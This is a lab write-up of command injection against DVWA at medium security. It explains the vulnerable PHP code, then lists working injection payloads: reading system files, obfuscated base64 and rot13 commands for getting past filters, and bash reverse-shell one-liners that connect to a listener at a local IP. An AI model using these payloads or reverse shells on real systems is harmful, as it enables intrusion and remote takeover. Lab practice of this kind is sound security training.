# Command Injection DVWA Medium Level Security


## Command Injection Of DVWA
- In this first we change to level `Medium`:
<img width="798" height="698" alt="image" src="https://github.com/user-attachments/assets/c6f56945-6f0b-458b-b436-5f6a6101684d" />

- In this first we should go to view `Vulnerable Code`:
<img width="803" height="726" alt="image" src="https://github.com/user-attachments/assets/10412925-bb2c-41f5-af34-b48cbb629117" />


### Breakdown:
- Checks if the form was submitted:
````
if (isset($_POST['Submit']))
````
- This ensures the code only runs when the user clicks the "Submit" button.
- Gets user input:
````
$target = $_REQUEST['ip'];
````

- It grabs the IP address from the form input (could be GET or POST).
- Applies a blacklist filter:
````
$substitutions = array('&'=>'', ';'=>'', '|'=>'', ...);
$target = str_replace(array_keys($substitutions), $substitutions, $target);
````

- It tries to remove dangerous characters like &, ;, |, etc. But this is not foolproof — many bypasses exist.
- Detects OS and builds a ping command:
````
if (Windows) → ping -n 4
else → ping -c 4
````

- It chooses the right ping syntax based on OS.
- Executes the command:
````
$cmd = shell_exec("ping -c 4 " . $target);
````
- This is where the vulnerability lives — user input is passed directly to the shell.
- Displays the output:
````
echo "<pre>{$cmd}</pre>";
````





## 1. Web Application Compromise
````
127.0.0.1 | whoami
````
<img width="807" height="438" alt="image" src="https://github.com/user-attachments/assets/a8cd9a1e-fcc0-4bdf-949f-01c36013f920" />


````
127.0.0.1 | find /var/www -name "*.php" -type f
````
<img width="944" height="751" alt="image" src="https://github.com/user-attachments/assets/fb88c23f-1de6-44d7-826a-c9b18c29c129" />

<img width="792" height="787" alt="image" src="https://github.com/user-attachments/assets/6f442fe3-cec0-4310-b469-fd895b325cb8" />

<img width="542" height="728" alt="image" src="https://github.com/user-attachments/assets/d5f5f6b5-6fb1-4946-bd96-5f2479340e91" />




## 2. Lateral Movement
````
127.0.0.1 | cat /etc/hosts
````
<img width="804" height="433" alt="image" src="https://github.com/user-attachments/assets/3151a00f-4ecf-485e-9a81-faa7df9ea70d" />




## 3. ADVANCED TROUBLESHOOTING

### Test command execution
````
127.0.0.1 | echo "test"
````
<img width="801" height="446" alt="image" src="https://github.com/user-attachments/assets/97e39b46-a598-4ef8-95f5-6a65a254e9a2" />



### Test different shells
````
127.0.0.1 | which bash
````
<img width="803" height="439" alt="image" src="https://github.com/user-attachments/assets/471f738a-348f-4fee-8e25-7988c35b34e7" />

````
127.0.0.1 | which sh
````
<img width="795" height="444" alt="image" src="https://github.com/user-attachments/assets/05a4bc0e-5447-4749-8db4-c36d31afbe39" />



### Test output methods
````
127.0.0.1 | whoami > /tmp/test.txt
127.0.0.1 | cat /tmp/test.txt
````
<img width="799" height="440" alt="image" src="https://github.com/user-attachments/assets/2abb8af0-c9aa-4c29-a1d3-7becad7eff34" />


---


## 4. EXTREME BYPASS 

### Extreme Obfuscation:
````
127.0.0.1 | `e\c\h\o "d2hvYW1p" | b\a\s\e\6\4 -d | b\a\s\h`
127.0.0.1 | $(printf "\167\150\157\141\155\151")
127.0.0.1 | i=`echo "jbunzv" | tr 'a-z' 'n-za-m'`; $i
````
<img width="794" height="439" alt="image" src="https://github.com/user-attachments/assets/f0e2c1a6-4992-4b61-b2e4-4907a7038e88" />


---


## 5. REVERSE SHELL VARIATIONS
- In this first we need to use `Netcat`:
````
nc -nvlp 4444
````

### Bash Variants
````
127.0.0.1 | bash -c 'bash -i >& /dev/tcp/192.168.127.128/4444 0>&1'
````
<img width="1338" height="703" alt="image" src="https://github.com/user-attachments/assets/dc8add66-bf03-4872-9776-77fc0f39d0aa" />

<img width="1871" height="712" alt="image" src="https://github.com/user-attachments/assets/4e78fec7-8c17-4242-90b4-6c4bca14b188" />


````
127.0.0.1 | /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.127.128/4444 0>&1'
````
<img width="1074" height="584" alt="image" src="https://github.com/user-attachments/assets/b23a5a2a-7fc1-4bc0-a7c2-d872caa0c8b9" />

<img width="1367" height="593" alt="image" src="https://github.com/user-attachments/assets/c2ea51a8-c343-438f-8bea-4d4ec744bc9d" />


---

---

## Finished of Command Injection DVWA

---

---

## Practice By: Nin Kanong (k4n0ng)

---
